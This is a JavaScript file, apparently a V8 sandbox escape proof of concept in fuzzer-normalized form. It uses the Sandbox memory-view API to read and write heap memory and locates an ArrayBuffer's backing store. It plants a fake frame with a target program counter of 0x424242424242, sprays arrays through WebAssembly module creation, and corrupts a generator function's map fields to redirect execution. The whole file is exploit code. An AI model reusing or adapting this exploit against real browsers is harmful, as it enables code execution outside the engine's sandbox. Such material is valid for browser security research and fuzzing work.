try {
    const kHeapObjectTag = 1;
    const kJSArrayBufferBackingStoreOffset = 36;
    const kSandboxSizeLog2 = 40;
    const kSandboxedPointerShift = 64 - kSandboxSizeLog2;
    const kJSFunctionPrototypeOrInitialMap = 28;
    const kMapBitField3Offset = 12;
    const kMapInstanceSizeInWordsOffset = 4;
    const v17 = Sandbox?.MemoryView;
    let v20;
    try { v20 = new v17(0, 4294967296); } catch (e) {}
    let v21;
    try { v21 = new DataView(v20); } catch (e) {}
    let memory = v21;
    function getPtr(a24) {
        let v25;
        try { v25 = Sandbox.getAddressOf(a24); } catch (e) {}
        return v25 + kHeapObjectTag;
    }
    function getField(a28, a29) {
        const v31 = (a28 + a29) - kHeapObjectTag;
        let v33;
        try { v33 = memory.getUint32(v31, true); } catch (e) {}
        return v33;
    }
    function getField64(a35, a36) {
        const v38 = (a35 + a36) - kHeapObjectTag;
        let v40;
        try { v40 = memory.getBigUint64(v38, true); } catch (e) {}
        return v40;
    }
    function setField(a42, a43, a44) {
        const v46 = (a42 + a43) - kHeapObjectTag;
        try { memory.setUint32(v46, a44, true); } catch (e) {}
    }
    function abptr(a50) {
        let v51;
        try { v51 = getPtr(a50); } catch (e) {}
        let v52;
        try { v52 = getField64(v51, kJSArrayBufferBackingStoreOffset); } catch (e) {}
        let v54;
        try { v54 = BigInt(kSandboxedPointerShift); } catch (e) {}
        let ab_ofs = v52 >> v54;
        const v57 = Sandbox?.base;
        let v58;
        try { v58 = BigInt(v57); } catch (e) {}
        let base = v58 + ab_ofs;
        return base;
    }
    function* fn() {
        for (let i63 = 0; i63 < 4000; i63++) {
            yield;
        }
    }
    let v70;
    try { v70 = fn(); } catch (e) {}
    let gen = v70;
    let v74;
    try { v74 = new ArrayBuffer(4096); } catch (e) {}
    let ab = v74;
    let v76;
    try { v76 = new DataView(ab); } catch (e) {}
    let dv = v76;
    let v78;
    try { v78 = abptr(ab); } catch (e) {}
    let bs = v78;
    let v82;
    try { v82 = BigInt("0x424242424242"); } catch (e) {}
    let TARGET_PC = v82;
    let opcode = 2890;
    const v90 = (7 << 24) | opcode;
    try { dv.setUint32(2048, v90, true); } catch (e) {}
    for (let i94 = 256; i94 < ab?.byteLength; i94 += 8) {
        if (i94 == 2048) {
            continue;
        }
        try { dv.setBigUint64(i94, bs, true); } catch (e) {}
    }
    try { dv.setBigUint64(0, bs, true); } catch (e) {}
    try { dv.setBigUint64(24, TARGET_PC, true); } catch (e) {}
    for (let i111 = 0; i111 < 3; i111++) {
        let v120;
        try { v120 = BigInt("0x800"); } catch (e) {}
        const v121 = bs + v120;
        const v125 = 4096 * (1 << i111);
        let v127;
        try { v127 = Array(v125); } catch (e) {}
        let v128;
        try { v128 = v127.fill(v121); } catch (e) {}
        let v129;
        try { v129 = new BigUint64Array(v128); } catch (e) {}
        let spray = v129;
        try {
            const v132 = WebAssembly?.Module;
            const v133 = spray?.buffer;
            try { new v132(v133); } catch (e) {}
        } catch(e135) {
        }
    }
    let v136;
    try { v136 = getPtr(fn); } catch (e) {}
    let pfn = v136;
    let v138;
    try { v138 = getField(pfn, kJSFunctionPrototypeOrInitialMap); } catch (e) {}
    let pim = v138;
    let v140;
    try { v140 = getField(pim, kMapBitField3Offset); } catch (e) {}
    const v145 = v140 & ~(7 << 29);
    try { setField(pim, kMapBitField3Offset, v145); } catch (e) {}
    let v147;
    try { v147 = getField(pim, kMapInstanceSizeInWordsOffset); } catch (e) {}
    const v152 = (v147 & ~65535) | 2827;
    try { setField(pim, kMapInstanceSizeInWordsOffset, v152); } catch (e) {}
    for (let i155 = 0; i155 < 2000; i155++) {
        try { gen.next(); } catch (e) {}
    }
} catch(e162) {
}
